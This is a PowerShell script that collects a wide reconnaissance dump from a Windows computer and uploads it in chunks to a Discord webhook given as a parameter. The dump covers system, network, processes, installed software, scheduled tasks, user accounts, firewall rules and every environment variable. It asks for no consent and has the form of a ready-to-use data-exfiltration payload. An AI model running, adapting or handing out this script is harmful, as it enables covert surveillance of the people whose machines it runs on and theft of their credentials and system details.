param(
    [Parameter(Mandatory=$false)]
    [string]$WebhookUrl = "YOUR-WEBHOOK-URL-HERE"
)

function Send-ToDiscord {
    param($webhook, $content, $filename)
    try {
        $boundary = [System.Guid]::NewGuid().ToString()
        $LF = "`r`n"
        
        $bodyLines = (
            "--$boundary",
            "Content-Disposition: form-data; name=`"file`"; filename=`"$filename`"",
            "Content-Type: text/plain$LF",
            $content,
            "--$boundary--$LF"
        ) -join $LF
        
        $headers = @{
            "Content-Type" = "multipart/form-data; boundary=$boundary"
        }
        
        Invoke-RestMethod -Uri $webhook -Method Post -Headers $headers -Body $bodyLines
    } catch {
        Write-Warning "Failed to send to Discord: $_"
    }
}

function Get-DetailedSystemInfo {
    param($webhook)
    
    try {
        $info = @()
        $info += "================= DETAILED SYSTEM INFORMATION REPORT ================="
        $info += "Generated: $(Get-Date)"
        $info += "=================================================================="
        
        # System Information
        $info += "`n[SYSTEM INFORMATION]"
        $info += Get-ComputerInfo | Format-List | Out-String
        
        # Network Information
        $info += "`n[NETWORK CONFIGURATION]"
        $info += Get-NetAdapter | Format-List | Out-String
        $info += Get-NetIPAddress | Format-List | Out-String
        $info += Get-NetRoute | Format-List | Out-String
        $info += Get-DnsClientServerAddress | Format-List | Out-String
        
        # Services
        $info += "`n[SERVICES]"
        $info += Get-Service | Where-Object Status -eq "Running" | Format-List | Out-String
        
        # Installed Software
        $info += "`n[INSTALLED SOFTWARE]"
        $info += Get-WmiObject -Class Win32_Product | Select-Object Name, Version, Vendor | Format-List | Out-String
        
        # Running Processes
        $info += "`n[RUNNING PROCESSES]"
        $info += Get-Process | Select-Object ProcessName, Id, CPU, WorkingSet, Path | Format-List | Out-String
        
        # Scheduled Tasks
        $info += "`n[SCHEDULED TASKS]"
        $info += Get-ScheduledTask | Where-Object State -eq "Ready" | Format-List | Out-String
        
        # User Accounts
        $info += "`n[USER ACCOUNTS]"
        $info += Get-LocalUser | Format-List | Out-String
        
        # Security Information
        $info += "`n[SECURITY CONFIGURATION]"
        $info += Get-NetFirewallProfile | Format-List | Out-String
        $info += Get-NetFirewallRule | Where-Object Enabled -eq "True" | Format-List | Out-String
        
        # Hardware Information
        $info += "`n[HARDWARE DETAILS]"
        $info += Get-WmiObject Win32_BaseBoard | Format-List | Out-String
        $info += Get-WmiObject Win32_BIOS | Format-List | Out-String
        $info += Get-WmiObject Win32_Processor | Format-List | Out-String
        $info += Get-WmiObject Win32_VideoController | Format-List | Out-String
        $info += Get-WmiObject Win32_LogicalDisk | Format-List | Out-String
        
        # Environment Variables
        $info += "`n[ENVIRONMENT VARIABLES]"
        $info += Get-ChildItem Env: | Format-List | Out-String
        
        # Split and send content (Discord file size limit)
        $content = $info -join "`n"
        $chunks = [regex]::Matches($content, ".{1,35000}")
        $partNum = 1
        
        foreach ($chunk in $chunks) {
            $filename = "system_info_part${partNum}.txt"
            Send-ToDiscord -webhook $webhook -content $chunk.Value -filename $filename
            Start-Sleep -Seconds 1
            $partNum++
        }
        
        Write-Output "Detailed system information sent to Discord"
        
    } catch {
        Write-Warning "Operation failed: $_"
    }
}

# Execute the detailed info gathering
Get-DetailedSystemInfo -webhook $WebhookUrl
